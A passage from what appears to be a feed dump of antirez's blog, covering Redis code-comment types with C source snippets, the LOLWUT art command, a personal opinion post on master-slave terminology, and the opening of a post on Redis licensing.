<br>        lua_pop(lua,1);             /* Stack: array, table */
<br>        lua_pushstring(lua,\"sort\"); /* Stack: array, table, sort */
<br>        lua_gettable(lua,-2);       /* Stack: array, table, table.sort */
<br>        lua_pushvalue(lua,-3);      /* Stack: array, table, table.sort, array */
<br>        lua_getglobal(lua,\"__redis__compare_helper\");
<br>        /* Stack: array, table, table.sort, array, __redis__compare_helper */
<br>        lua_call(lua,2,0);
<br>    }
<br>
<br>Lua uses a stack based API. A reader following each call in the function above, having also a Lua API reference at hand, will be able to mentally reconstruct the stack layout at every given moment. But why to force the reader to do such effort? While writing the code, the original author had to do that mental effort anyway. What I did there was just to annotate every line with the current stack layout after every call. Reading this code is now trivial, regardless of the fact the Lua API is otherwise non trivial to follow.
<br>
<br>My goal here is not just to offer my point of view on the usefulness of comments as a tool to provide a background that is not clearly available reading a local section of the source code. But also to also provide some evidence about the usefulness of the kind of comments that are historically considered useless or even dangerous, that is, comments stating *what* the code is doing, and not why.
<br>
<br># Classification of comments
<br>
<br>The way I started this work was by reading random parts of the Redis source code, to check if and why comments were useful in different contexts. What quickly emerged was that comments are useful for very different reasons, since they tend to be very different in function, writing style, length and update frequency. I eventually turned the work into a classification task.
<br>
<br>During my research I identified nine types of comments:
<br>
<br>* Function comments
<br>* Design comments
<br>* Why comments
<br>* Teacher comments
<br>* Checklist comments
<br>* Guide comments
<br>* Trivial comments
<br>* Debt comments
<br>* Backup comments
<br>
<br>The first six are, in my opinion, mostly very positive forms of commenting, while the final three are somewhat questionable. In the next sections each type will be analyzed with examples from the Redis source code.
<br>
<br>FUNCTION COMMENTS
<br>
<br>The goal of a function comment is to prevent the reader from reading code in the first place. Instead, after reading the comment, it should be possible to consider some code as a black box that should obey certain rules. Normally function comments are at the top of functions definitions, but they may be at other places, documenting classes, macros, or other functionally isolated blocks of code that define some interface.
<br>
<br>rax.c:
<br>
<br>    /* Seek the grestest key in the subtree at the current node. Return 0 on
<br>     * out of memory, otherwise 1. This is an helper function for different
<br>     * iteration functions below. */
<br>    int raxSeekGreatest(raxIterator *it) {
<br>    ...
<br>
<br>Function comments are actually a form of in-line API documentation. If the function comment is written well enough, the user should be able most of the times to jump back to what she was reading (reading the code calling such API) without having to read the implementation of a function, a class, a macro, or whatever.
<br>
<br>Among all the kinds of comments, these are the ones most widely accepted by the programming community at large as needed. The only point to analyze is if it is a good idea to place comments that are largely API reference documentation inside the code itself. For me the answer is simple: I want the API documentation to exactly match the code. As the code is changed, the documentation should be changed. For this reason, by using function comments as a prologue of functions or other elements, we make the API documentation close to the code, accomplishing three results:
<br>
<br>* As the code is changed, the documentation can be easily changed at the same time, without the risk of making the API reference stale.
<br>
<br>* This approach maximizes the probability that the author of the change, that should be the one better understanding the change, will also be the author of the API documentation change.
<br>
<br>* Reading the code is handy to find the documentation of functions or methods directly where they are defined, so that the reader of the code can focus solely on the code, instead of context switching between code and documentation.
<br>
<br>DESIGN COMMENTS
<br>
<br>While a \"function comment\" is usually located at the start of a function, a design comment is more often located at the start of a file. The design comment basically states how and why a given piece of code uses certain algorithms, techniques, tricks, and implementation. It is an higher level overview of what you'll see implemented in the code. With such background, reading the code will be simpler. Moreover I tend to trust more code where I can find design notes. At least I know that some kind of explicit design phase happened, at some point, during the development process.
<br>
<br>In my experience design comments are also very useful in order to state, in case the solution proposed by the implementation looks a bit too trivial, what were the competing solutions and why a very simple solution was considered to be enough for the case at hand. If the design is correct, the reader will convince herself that the solution is appropriate and that such simplicity comes from a process, not from being lazy or only knowing how to code basic things.
<br>
<br>bio.c:
<br>     * DESIGN
<br>     * ------
<br>     *
<br>     * The design is trivial, we have a structure representing a job to perform
<br>     * and a different thread and job queue for every job type.
<br>     * Every thread waits for new jobs in its queue, and process every job
<br>     * sequentially.
<br>     ...
<br>
<br>WHY COMMENTS
<br>
<br>Why comments explain the reason why the code is doing something, even if what the code is doing is crystal clear. See the following example from the Redis replication code.
<br>
<br>replication.c:
<br>
<br>    if (idle > server.repl_backlog_time_limit) {
<br>	/* When we free the backlog, we always use a new
<br>	 * replication ID and clear the ID2. This is needed
<br>	 * because when there is no backlog, the master_repl_offset
<br>	 * is not updated, but we would still retain our replication
<br>	 * ID, leading to the following problem:
<br>	 *
<br>	 * 1. We are a master instance.
<br>	 * 2. Our replica is promoted to master. It's repl-id-2 will
<br>	 *    be the same as our repl-id.
<br>	 * 3. We, yet as master, receive some updates, that will not
<br>	 *    increment the master_repl_offset.
<br>	 * 4. Later we are turned into a replica, connect to the new
<br>	 *    master that will accept our PSYNC request by second
<br>	 *    replication ID, but there will be data inconsistency
<br>	 *    because we received writes. */
<br>	changeReplicationId();
<br>	clearReplicationId2();
<br>	freeReplicationBacklog();
<br>	serverLog(LL_NOTICE,
<br>	    \"Replication backlog freed after %d seconds \"
<br>	    \"without connected replicas.\",
<br>	    (int) server.repl_backlog_time_limit);
<br>    }
<br>
<br>If I check just the function calls there is very little to wonder: if a timeout is reached, change the main replication ID, clear the secondary ID, and finally free the replication backlog. However what is not exactly clear is why we need to change the replication IDs when freeing the backlog.
<br>
<br>Now this is the kind of thing that happens continuously in software once it has reached a given level of complexity. Regardless of the code involved, the replication protocol has some level of complexity itself, so we need to do certain things in order to make sure that other bad things can't happen. Probably these kind of comments are, in some way, opportunities to reason about the system and check if it should be improved, so that such complexity is no longer needed, hence also the comment can be removed. However often making something simpler may make something else harder or is simply not viable, or requires future work breaking backward compatibility.
<br>
<br>Here is another one.
<br>
<br>replication.c:
<br>
<br>    /* SYNC can't be issued when the server has pending data to send to
<br>     * the client about already issued commands. We need a fresh reply
<br>     * buffer registering the differences between the BGSAVE and the current
<br>     * dataset, so that we can copy to other replicas if needed. */
<br>    if (clientHasPendingReplies(c)) {
<br>        addReplyError(c,\"SYNC and PSYNC are invalid with pending output\");
<br>        return;
<br>    }
<br>
<br>If you run SYNC while there is still pending output (from a past command) to send to the client, the command should fail because during the replication handshake the output buffer of the client is used to accumulate changes,  and may be later duplicated to serve other replicas connecting while we are already creating the RDB file for the full sync with the first replica. This is the why we do that. What we do is trivial. Pending replies? Emit an error. Why is rather obscure without the comment.
<br>
<br>One may think that such comments are needed only when describing complex protocols and interactions, like in the case of replication. Is that the case? Let's change completely file and goals, and we see still such comments everywhere.
<br>
<br>expire.c:
<br>
<br>    for (j = 0; j < dbs_per_call && timelimit_exit == 0; j++) {
<br>        int expired;
<br>        redisDb *db = server.db+(current_db % server.dbnum);
<br>
<br>        /* Increment the DB now so we are sure if we run out of time
<br>         * in the current DB we'll restart from the next. This allows to
<br>         * distribute the time evenly across DBs. */
<br>        current_db++;
<br>        ...
<br>
<br>That's an interesting one. We want to expire keys from different DBs, as long as we have some time. However instead of incrementing the “database ID” to process next at the end of the loop processing the current database, we do it differently: we select the current DB in the `db` variable, but then we immediately increment the ID of the next database to process (at the next call of this function). This way if the function terminates because too much effort was spent in a single call, we don't have the problem of restarting again from the same database, letting logically expired keys accumulating in the other databases since we are too focused in processing the same database again and again.
<br>
<br>With such comment we both explain why we increment at that stage, and that the next person going to modify the code, should preserve such quality. Note that without the comment the code looks completely harmless. Select, increment, go to do some work. There is no evident reason for not relocating the increment at the end of the loop where it could look more natural.
<br>
<br>Trivia: the loop increment was indeed at the end in the original code. It was moved there during a fix: at the same time the comment was added. So let's say this is kinda of a \"regression comment\".
<br>
<br>TEACHER COMMENTS
<br>
<br>Teacher comments don't try to explain the code itself or certain side effects we should be aware of. They teach instead the *domain* (for example math, computer graphics, networking, statistics, complex data structures) in which the code is operating, that may be one outside of the reader skills set, or is simply too full of details to recall all them from memory.
<br>
<br>The LOLWUT command in version 5 needs to display rotated squares on the screen (http://antirez.com/news/123). In order to do so it uses some basic trigonometry: despite the fact that the math used is simple, many programmers reading the Redis source code may not have any math background, so the comment at the top of the function explains what's going to happen inside the function itself.
<br>
<br>lolwut5.c:
<br>
<br>    /* Draw a square centered at the specified x,y coordinates, with the specified
<br>     * rotation angle and size. In order to write a rotated square, we use the
<br>     * trivial fact that the parametric equation:
<br>     *
<br>     *  x = sin(k)
<br>     *  y = cos(k)
<br>     *
<br>     * Describes a circle for values going from 0 to 2*PI. So basically if we start
<br>     * at 45 degrees, that is k = PI/4, with the first point, and then we find
<br>     * the other three points incrementing K by PI/2 (90 degrees), we'll have the
<br>     * points of the square. In order to rotate the square, we just start with
<br>     * k = PI/4 + rotation_angle, and we are done.
<br>     *
<br>     * Of course the vanilla equations above will describe the square inside a
<br>     * circle of radius 1, so in order to draw larger squares we'll have to
<br>     * multiply the obtained coordinates, and then translate them. However this
<br>     * is much simpler than implementing the abstract concept of 2D shape and then
<br>     * performing the rotation/translation transformation, so for LOLWUT it's
<br>     * a good approach. */
<br>
<br>The comment does not contain anything that is related to the code of the function itself, or its side effects, or the technical details related to the function. The description is only limited to the mathematical concept that is used inside the function in order to reach a given goal.
<br>
<br>I think teacher comments are of huge value. They teach something in case the reader is not aware of such concepts, or at least provide a starting point for further investigation. But this in turn means that a teacher comment increases the amount of programmers that can read some code path: writing code that can be read by many programmers is a major goal of mine. There are developers that may not have math skills but are very solid programmers that can contribute some wonderful fix or optimization. And in general code should be read other than being executed, since is written by humans for other humans.
<br>
<br>There are cases where teacher comments are almost impossible to avoid in order to write decent code. A good example is the Redis radix tree implementation. Radix trees are articulated data structures. The Redis implementation re-states the whole data structure theory as it implements it, showing the different cases and what the algorithm does to merge or split nodes and so forth. Immediately after each section of comment, we have the code implementing what was written before. After months of not touching the file implementing the radix tree, I was able to open it, fix a bug in a few minutes, and continue doing something else. There is no need to study again how a radix tree works, since the explanation is the same thing as the code itself, all mixed together.
<br>
<br>The comments are too long, so I'll just show certain snippets.
<br>
<br>rax.c:
<br>
<br>    /* If the node we stopped at is a compressed node, we need to
<br>     * split it before to continue.
<br>     *
<br>     * Splitting a compressed node have a few possible cases.
<br>     * Imagine that the node 'h' we are currently at is a compressed
<br>     * node contaning the string \"ANNIBALE\" (it means that it represents
<br>     * nodes A -> N -> N -> I -> B -> A -> L -> E with the only child
<br>     * pointer of this node pointing at the 'E' node, because remember that
<br>     * we have characters at the edges of the graph, not inside the nodes
<br>     * themselves.
<br>     *
<br>     * In order to show a real case imagine our node to also point to
<br>     * another compressed node, that finally points at the node without
<br>     * children, representing 'O':
<br>     *
<br>     *     \"ANNIBALE\" -> \"SCO\" -> []
<br>
<br>     ... snip ...
<br>
<br>     * 3a. IF $SPLITPOS == 0:
<br>     *     Replace the old node with the split node, by copying the auxiliary
<br>     *     data if any. Fix parent's reference. Free old node eventually
<br>     *     (we still need its data for the next steps of the algorithm).
<br>     *
<br>     * 3b. IF $SPLITPOS != 0:
<br>     *     Trim the compressed node (reallocating it as well) in order to
<br>     *     contain $splitpos characters. Change chilid pointer in order to link
<br>     *     to the split node. If new compressed node len is just 1, set
<br>     *     iscompr to 0 (layout is the same). Fix parent's reference.
<br>
<br>     ... snip ...
<br>
<br>        if (j == 0) {
<br>            /* 3a: Replace the old node with the split node. */
<br>            if (h->iskey) {
<br>                void *ndata = raxGetData(h);
<br>                raxSetData(splitnode,ndata);
<br>            }
<br>            memcpy(parentlink,&splitnode,sizeof(splitnode));
<br>        } else {
<br>            /* 3b: Trim the compressed node. */
<br>            trimmed->size = j;
<br>            memcpy(trimmed->data,h->data,j);
<br>            trimmed->iscompr = j > 1 ? 1 : 0;
<br>            trimmed->iskey = h->iskey;
<br>            trimmed->isnull = h->isnull;
<br>            if (h->iskey && !h->isnull) {
<br>                void *ndata = raxGetData(h);
<br>                raxSetData(trimmed,ndata);
<br>            }
<br>            raxNode **cp = raxNodeLastChildPtr(trimmed);
<br>        ...
<br>
<br>As you can see the description in the comment is then matched with the same labels in the code. It's hard to show it all in this form so if you want to get the whole idea just check the full file at:
<br>
<br>    https://github.com/antirez/redis/blob/unstable/src/rax.c
<br>
<br>This level of commenting is not needed for everything, but things like radix trees are really full of little details and corner cases. They are hard to recall, and certain details are *specific* to a given implementation. Doing this for a linked list does not make much sense of course. It's a matter of personal sensibility to understand when it's worth it or not.
<br>
<br>CHECKLIST COMMENTS
<br>
<br>This is a very common and odd one: sometimes because of language limitations, design issues, or simply because of the natural complexity arising in systems, it is not possible to centralize a given concept or interface in one piece, so there are places in the code that tells you to remember to do things in some other place of the code. The general concept is:
<br>
<br>    /* Warning: if you add a type ID here, make sure to modify the
<br>     * function getTypeNameByID() as well. */
<br>
<br>In a perfect world this should never be needed, but in practice sometimes there are no escapes from that. For example Redis types could be represented using an \"object type\" structure, and every object could link to the type the object it belongs, so you could do:
<br>
<br>    printf(\"Type is %s\\n\", myobject->type->name);
<br>
<br>But guess what? It's too expensive for us, because a Redis object is represented like this:
<br>
<br>    typedef struct redisObject {
<br>        unsigned type:4;
<br>        unsigned encoding:4;
<br>        unsigned lru:LRU_BITS; /* LRU time (relative to global lru_clock) or
<br>                                * LFU data (least significant 8 bits frequency
<br>                                * and most significant 16 bits access time). */
<br>        int refcount;
<br>        void *ptr;
<br>    } robj;
<br>
<br>We use 4 bits instead of 64 to represent the type. This is just to show why sometimes things are not as centralized and natural as they should be. When the situation is like that, sometimes what helps is to use defensive commenting in order to make sure that if a given code section is touched, it reminds you to make sure to also modify other parts of the code. Specifically a checklist comment does one or both of the following things:
<br>
<br>* It tells you a set of actions to do when something is modified.
<br>
<br>* It warns you about the way certain changes should be operated.
<br>
<br>Another example in blocked.c, when a new blocking type is introduced.
<br>
<br>blocked.c:
<br>
<br>     * When implementing a new type of blocking opeation, the implementation
<br>     * should modify unblockClient() and replyToBlockedClientTimedOut() in order
<br>     * to handle the btype-specific behavior of this two functions.
<br>     * If the blocking operation waits for certain keys to change state, the
<br>     * clusterRedirectBlockedClientIfNeeded() function should also be updated.
<br>
<br>The checklist comment is also useful in a context similar to when certain \"why comments\" are used: when it is not obvious why some code must be executed at a given place, after or before something. But while the why comment may tell you why a statement is there, the checklist comment used in the same case is more biased towards telling you what rules to follow if you want to modify it (in this case the rule is, follow a given ordering), without breaking the code behavior.
<br>
<br>cluster.c:
<br>
<br>    /* Update our info about served slots.
<br>     *
<br>     * Note: this MUST happen after we update the master/replica state
<br>     * so that CLUSTER_NODE_MASTER flag will be set. */
<br>
<br>Checklist comments are very common inside the Linux kernel, where the order of certain operations is extremely important.
<br>
<br>GUIDE COMMENT
<br>
<br>I abuse guide comments at such a level that probably, the majority of comments in Redis are guide comments. Moreover guide comments are exactly what most people believe to be completely useless comments.
<br>
<br>* They don't state what is not clear from the code.
<br>
<br>* There are no design hints in guide comments.
<br>
<br>Guide comments do a single thing: they babysit the reader, assist him or her while processing what is written in the source code by providing clear division, rhythm, and introducing what you are going to read.
<br>
<br>Guide comments’ sole reason to exist is to lower the cognitive load of the programmer reading some code.
<br>
<br>rax.c:
<br>
<br>    /* Call the node callback if any, and replace the node pointer
<br>     * if the callback returns true. */
<br>    if (it->node_cb && it->node_cb(&it->node))
<br>	memcpy(cp,&it->node,sizeof(it->node));
<br>
<br>    /* For \"next\" step, stop every time we find a key along the
<br>     * way, since the key is lexicographically smaller compared to
<br>     * what follows in the sub-children. */
<br>    if (it->node->iskey) {
<br>	it->data = raxGetData(it->node);
<br>
<br>	return 1;
<br>    }
<br>
<br>There is nothing that the comments are adding to the code above. The guide comments above will assist you reading the code, moreover they'll acknowledge you about the fact you are understanding it right. More examples.
<br>
<br>networking.c:
<br>
<br>    /* Log link disconnection with replica */
<br>    if ((c->flags & CLIENT_SLAVE) && !(c->flags & CLIENT_MONITOR)) {
<br>        serverLog(LL_WARNING,\"Connection with replica %s lost.\",
<br>            replicationGetSlaveName(c));
<br>    }
<br>
<br>    /* Free the query buffer */
<br>    sdsfree(c->querybuf);
<br>    sdsfree(c->pending_querybuf);
<br>    c->querybuf = NULL;
<br>
<br>    /* Deallocate structures used to block on blocking ops. */
<br>    if (c->flags & CLIENT_BLOCKED) unblockClient(c);
<br>    dictRelease(c->bpop.keys);
<br>
<br>    /* UNWATCH all the keys */
<br>    unwatchAllKeys(c);
<br>    listRelease(c->watched_keys);
<br>
<br>    /* Unsubscribe from all the pubsub channels */
<br>    pubsubUnsubscribeAllChannels(c,0);
<br>    pubsubUnsubscribeAllPatterns(c,0);
<br>    dictRelease(c->pubsub_channels);
<br>    listRelease(c->pubsub_patterns);
<br>
<br>    /* Free data structures. */
<br>    listRelease(c->reply);
<br>    freeClientArgv(c);
<br>
<br>    /* Unlink the client: this will close the socket, remove the I/O
<br>     * handlers, and remove references of the client from different
<br>     * places where active clients may be referenced. */
<br>    unlinkClient(c);
<br>
<br>Redis is *literally* ridden of guide comments, so basically every file you open will contain plenty of them. Why bother? Of all the comment types I analyzed so far in this blog post, I'll admit that this is absolutely the most subjective one. I don't value code without such comments as less good, yet I firmly believe that if people regard the Redis code as readable, some part of the reason is because of all the guide comments.
<br>
<br>Guide comments have some usefulness other than the stated ones. Since they clearly divide the code in isolated sections, an addition to the code is very likely to be inserted in the appropriate section, instead of ending in some random part. To have related statements nearby is a big readability win.
<br>
<br>Also make sure to check the guide comment above before the unlinkClient() function is called. The guide comment briefly tells the reader what the function is going to do, avoiding the need to jump back into the function if you are only interested in the big picture.
<br>
<br>TRIVIAL COMMENTS
<br>
<br>Guide comments are very subjective tools. You may like them or not. I love them. However, a guide comment can degenerate into a a very bad comment: it can easily turn into a \"trivial comment\". A trivial comment is a guide comment where the cognitive load of reading the comment is the same or higher than just reading the associated code. The following form of trivial comment is exactly what many books will tell you to avoid.
<br>
<br>    array_len++;	/* Increment the length of our array. */
<br>
<br>So if you write guide comments, make sure you avoid writing trivial ones.
<br>
<br>DEBT COMMENTS
<br>
<br>Debt comments are technical debts statements hard coded inside the source code itself:
<br>
<br>t_stream.c:
<br>
<br>    /* Here we should perform garbage collection in case at this point
<br>     * there are too many entries deleted inside the listpack. */
<br>    entries -= to_delete;
<br>    marked_deleted += to_delete;
<br>    if (entries + marked_deleted > 10 && marked_deleted > entries/2) {
<br>	/* TODO: perform a garbage collection. */
<br>    }
<br>
<br>The snippet above is extracted from the Redis streams implementation. Redis streams allow to delete elements from the middle using the XDEL command. This may be useful in different ways, especially in the context of privacy regulations where certain data cannot be retained no matter what data structure or system you are using in order to store them. It is a very odd use case for a mostly append only data structure, but if users start to delete more than 50% of items in the middle, the stream starts to fragment, being composed of \"macro nodes\". Entries are just flagged as deleted, but are only reclaimed once all the entries in a given macro node are freed. So your mass deletions will change the memory behavior of streams.
<br>
<br>Right now, this looks like a non issue, since I don't expect users to delete most history in a stream. However it is possible that in the future we may want to introduce garbage collection: the macro node could be compacted once the ratio between the deleted entries and the existing entries reach a given level. Moreover nearby nodes may be glued together after the garbage collection. I was kind of afraid that later I would no longer remember what were the entry points to do the garbage collection, so I put TODO comments, and even wrote the trigger condition.
<br>
<br>This is probably not great. A better idea was instead to write, in the design comment at the top of the file, why we are currently not performing GC. And what are the entry points for GC, if we want to add it later.
<br>
<br>FIXME, TODO, XXX, \"This is a hack\", are all forms of debt comments. They are not great in general, I try to avoid them, but it's not always possible, and sometimes instead of forgetting forever about a problem, I prefer to put a node inside the source code. At least one should periodically grep for such comments, and see if it is possible to put the notes in a better place, or if the problem is no longer relevant or could be fixed right away.
<br>
<br>BACKUP COMMENTS
<br>
<br>Finally backup comments are the ones where the developer comments older versions of some code block or even a whole function, because she or he is insecure about the change that was operated in the new one. What is puzzling is that this still happens now that we have Git. I guess people have an uneasy feeling about losing that code fragment, considered more sane or stable, in some years old commit.
<br>
<br>But source code is not for making backups. If you want to save an older version of a function or code part, your work is not finished and cannot be committed. Either make sure the new function is better than the past one, or take it just in your development tree until you are sure.
<br>
<br>Backup comments end my classification. Let's try some conclusion.
<br>
<br># Comments as an analysis tool.
<br>
<br>Comments are rubber duck debugging on steroids, except you are not talking with a rubber duck, but with the future reader of the code, which is more intimidating than a rubber duck, and can use Twitter. So in the process you really try to understand if what you are stating *is acceptable*, honorable, good enough. And if it is not, you make your homework, and come up with something more decent.
<br>
<br>It is the same process that happens while writing documentation: the writer attempts to provide the gist of what a given piece of code does, what are the guarantees, the side effects. This is often a bug hunting opportunity. It is very easy while describing something to find that it has holes... You can't really describe it all because you are not sure about a given behavior: such behavior is just emerging from complexity, at random. You really don't want that, so you go back and fix it all. I find this a splendid reason to write comments.
<br>
<br># Writing good comments is harder than writing good code
<br>
<br>You may think that writing comments is a lesser noble form of work. After all you *can code*! However consider this: code is a set of statement and function calls, or whatever your programming paradigm is. Sometimes such statements do not make much sense, honestly, if the code is not good. Comments require always to have some design process ongoing, and to understand the code you are writing in a deeper sense. On top of that, in order to write good comments, you have to develop your writing skills. The same writing skills will assist you writing emails, documentation, design documents, blog posts, and commit messages.
<br>
<br>I write code because I have an urgent sense to share and communicate more than anything else. Comments coadiuvate the code, assist it, describe our efforts, and after all I love writing them as much as I love writing code itself.
<br>
<br>(Thanks to Michel Martens for giving feedbacks during the writing of this blog post)
<a href=\"http://antirez.com/news/124\">Comments</a>" nil "http://antirez.com/news/124" "50e04acaf2081b50860a364cf3aacc04") (76 (26588 31767 72539 897000) "http://antirez.com/news/123
" "LOLWUT: a piece of art inside a database command " nil "Wed, 12 Sep 2018 15:20:28 +0000" "The last few days have been quite intense. One of the arguments, about the dispute related to replacing or not the words used in Redis replication with different ones, was the following: is it worthwhile to do work that does not produce any technological result?
<br>
<br>As I was changing the Redis source code to get rid of a specific word where possible, I started to think that whatever my idea was about the work I was doing, I’m the kind of person that enjoys writing code that has no measurable technological effects. Replacing words is just annoying, even if, even there, there were a few worthwhile technological challenges. But there is some other kind of code that I believe has a quality called “hack value”. It may not solve any technological problem, yet it’s worth to write. Sometimes because the process of writing the code is, itself, rewarding. Other times because very technically advanced ideas are used to solve a not useful problem. Sometimes code is just written for artistic reasons.
<br>
<br>In some way the Twitter discussion of the last days, mostly uninformed, chaotic, heated, made me think that, at this point, we are very far from the first hackers in the 60s. As I get older I find that it is harder and harder to talk about technology with an hacking perspective, where there are no walls or pre-cooked ideas, and the limit is the exploration. For everything you say there is a best practice. For every idea there is a taboo. To this new setup I say LOLWUT, since I don’t feel represented by it, nor it represents hacking, at least in my vision. So the idea was to spend some technologically useless time in order to explore something of the 60s.
<br>
<br>My attention went immediately to one of the computer art pieces I love the most: Schotter, by Georg Nees (https://en.wikipedia.org/wiki/Georg_Nees). With the help of a plotter and ALGOL programs, Nees explored writing programs to generate art using caos (randomness) and repeating patterns. Schotter is remarkable because of the simplicity of the piece and the deep meaning that the observer can find looking at it. Under a surface of total calm and order, deep inside the disorder hides. Or, if you put it upside down it becomes like the sea during a tempest. However the surface may look impetuous, the deep sea remains calm.
<br>
<br>Is it possible to turn a piece of art into a database command? This was challenging because Redis is mostly used by a command line interface. Nowadays terminals are for sure fancier than the ones of the past, but yet to display decent graphics is hard. On the other side there is the huge advantage of the real time computation: a piece of art can be dynamic, changing every time it is generated.
<br>
<br>Before continuing, I want to show you the final result:
<br>
<br>img://antirez.com/misc/lolwut1.png
<br>
<br>While very low resolution the idea of the original piece is still there. To make this possible I used a trick that recently was used by multiple programs trying to display interesting things in a text console. It involves using the Braille unicode charset in order to create a pixel matrix which is more dense than the individual characters of the console. Specifically, for each character, it is possible to fit a 2x8 grid of pixels.
<br>
<br>The second part of the experiment was to make the art piece parametric:
<br>
<br>img://antirez.com/misc/lolwut2.png
<br>
<br>It is possible to generate different versions of the original piece, changing the number of squares and the output resolution. Finally the source code wanted to be an example of literate programming, being written in a form that resembles more a tutorial describing what everything does and why, instead of some opaque generator. You can find the code here:
<br>
<br>https://github.com/antirez/redis/blob/unstable/src/lolwut.c
<br>
<br>LOLWUT is also going to be a tradition starting from Redis 5. At each new major version of Redis what the command does will change completely, only a set of rules will be fixed:
<br>
<br>1. It can’t do anything technologically useful.
<br>2. It should be fast at doing what it does, so that it is safe to call LOLWUT on production instances.
<br>3. The output should be entertaining in some way.
<br>
<br>I wrote the first one for Redis 5, for the next versions, if I find interest, I’ll ask somebody else that contributed to Redis to write the other LOLWUT versions, otherwise I’ll write it again myself (but I hope that’s not the case). LOLWUT should remember ourselves that the work we do, programming, did not start just in order to produce something useful. Initially it was mainly a matter of exploring possibilities. I hope that LOLWUT also will remind the Redis community that computers are about humans, and that it is not possible to reason in an aseptic way just thinking at the technological implications. There are people using systems, people building systems, and so forth.
<a href=\"http://antirez.com/news/123\">Comments</a>" nil "http://antirez.com/news/123" "ddb1f5e0c8633649bbeccdd8b51f430d") (75 (26588 31767 72256 415000) "http://antirez.com/news/122
" "On Redis master-slave terminology " nil "Thu, 06 Sep 2018 21:04:56 +0000" "Today it happened again. A developer, that we’ll call Mark to avoid exposing his real name, read the Redis 5.0 RC5 change log, and was disappointed to see that Redis still uses the “master” and “slave” terminology in order to identify different roles in Redis replication.
<br>
<br>I said that I was sorry he was disappointed about that, but at the same time, I don’t believe that terminology out of context is offensive, so if I use master-slave in the context of databases, and I’m not referring in any way to slavery. I originally copied the terms from MySQL, and now they are the way we call things in Redis, and since I do not believe in this battle (I’ll tell you later why), to change the documentation, deprecate the API and add a new one, change the INFO fields, just to make a subset of people that care about those things more happy, do not make sense to me.
<br>
<br>After it was clear that I was not interested in his argument, Mark accused me of being fascist. Now I’m Italian, and incidentally my grand grand father was put in jail for years by fascists because he was communist and was against the regime. He was released to die in a couple of months at home. The father of my mother instead went in the north of Italy for II World War, and was able to escape from the Nazis for a miracle. Stayed 5 years as a refugee, and eventually returned home to become the father of my mother. Mark do not care about the terminology he uses against other people, if the matter at hand is to make sure people that may potentially feel offended will not.
<br>
<br>Now, it’s time for you to know my political orientation, so that you can put in context my refuse to change terminology. I want my government to be more open to immigration, including economical immigration, I do not accept any racism and I was strongly in favor of “ius soli” law here in Italy. I do not just accept conceptually same-sex marriage, but I really love the beauty that there is in two men or women kissing, making sex, adopting a child. Every day in Facebook and with my social sphere I actively talk about politics in order to push equality. I believe in a systematic bias that our society perpetuates against women, and I’m proud to live in a  country where women are free to not recognize the child as their own after giving birth, in order to have the same rights of the biological father that can go away: this was a big win of the European feminist movement in the 70s, together with the abortion right. I’m proud that in my country there is no death penalty like there is not in the rest of EU, that guns are mostly banned, that there is universal healthcare for free.
<br>
<br>I do not believe to be fascist or racist honestly, and I write almost daily about all this things on Facebook with my friends, talk at people on the street, and so forth. For years and years, since I was 16. So, what’s the problem with changing this terminology?
<br>
<br>The first problem is that every terminology is offensive in principle, and I don’t want to accept this idea that certain words that are problematic, especially for Americans to make peace with their past, should be banned. For example if I’m terminally ill, the “short living request” terminology may be offensive, it reminds me that I’m going to die, or that my father is going to die. Instead of banning every word out there, we should make the mental effort to do better than the political correctness movement that stops at the surface. So, let’s call it master-slave, and instead make a call for US, where a sizable black population is very poor, to have free healthcare, to have cops that are less biased against non-white people, to stop death penalty. This makes really a difference. For instance Europeans that are a lot less sensible to political correctness, managed to do a much better job on that stuff.
<br>
<br>There is more: I believe that political correctness has a puritan root. As such it focuses on formalities, but actually it has a real root of prejudice against others. For instance Mark bullied me because I was not complying with his ideas, showing problems at accepting differences in the way people think. I believe that this environment is making it impossible to have important conversations. For instance nobody at this point want to talk about women in tech and about the systematic bias of women in our society (to the point that recently in Japan it was discovered that women were systematically stopped from entering the best medical schools). People will go away once the discussion starts, because everybody knows that at this point to talk about this matters is a huge PR error, can cost you your job or company. Many, while reading this blog post, are thinking that I’m crazy at writing this stuff, even if they think likewise. Well, I don’t want that the people that did this to the our ability to have conversations will get a free pass to say what to do to others, because conversations is the only way we can make people that yet don't have an open vision to change ideas.
<br>
<br>Moreover I don't believe in the right to be offended, because it's a subjective thing. Different groups may feel offended by different things. To save the right of not being offended it becomes basically impossible to say or do anything in the long run. Is this the evolution of our society? A few days ago on Hacker News I discovered I can no longer say \"fake news\" for instance.
<br>
<br>I want a world of equity, opportunities, redistribution of wealth, and open borders. But the way I believe this world can be obtained is not by banning words, nor by stalking people on Twitter so that they comply with your ideology. I’ll continue my local political activity, and I’ll continue to write open source software. I hope that Mark, and the others like Mark, will let me live my life as I decided to do.
<a href=\"http://antirez.com/news/122\">Comments</a>" nil "http://antirez.com/news/122" "f5b86c5535b4e6b171d7b9210cdaa195") (74 (26588 31767 71924 228000) "http://antirez.com/news/121
" "Redis is not \"open core\" " nil "Fri, 24 Aug 2018 22:38:52 +0000" "Human beings have a strong tendency to put new facts into pre-existing categories. This is useful to mentally and culturally classify similar events under the same logical umbrella, so when two days ago I clarified that the Redis core was still released under the vanilla BSD license, and only certain Redis modules developed by Redis Labs were going to change license, from AGPL to a different non open source license, people said “Ah! Ok you are going open core”.
<br>
<br>The simplification this time does not work if it is in your interest to capture the truth of what is happening here. An open core technology requires two things. One is that the system is modular, and the other is that parts of such system are made proprietary in order to create a product around an otherwise free software. For example providing a single node of a database into the open source, and then having the clustering logic and mechanism implemented in a different non-free layer, is an open core technology. Similarly is open core if I write a relational database with a modular storage system, but the only storage that is able to provide strong guarantees is non free. In an open core business model around an open source system it is *fundamental* that you take something useful out of the free software part.
<br>
<br>Now for some time Redis is a modular system. You can use Redis modules in order to write many things, including new distributed systems using the recently introduced cluster message bus API, or new data types that look native. However the reason to make Redis modular was not to remove something useful from the system and put a price tag on it. For instance one of the new data structures in Redis 5, the streams, are part of the core and are released under the BSD license. Streams were implemented when Redis was already a modular system.
<br>
<br>Redis modules started from a different observation. As a premise I should say that I’m a very conservative person about software development. I believe that Redis should be focused to address just things that, when operated with in-memory data structures, offer strong advantages over other ways to do the same thing. I don’t want Redis to do much more than it does, or to employ every possible consistency tradeoff. I want Redis to be Redis, that is, this general tool that the developer can use in different ways to solve certain problems.
<br>
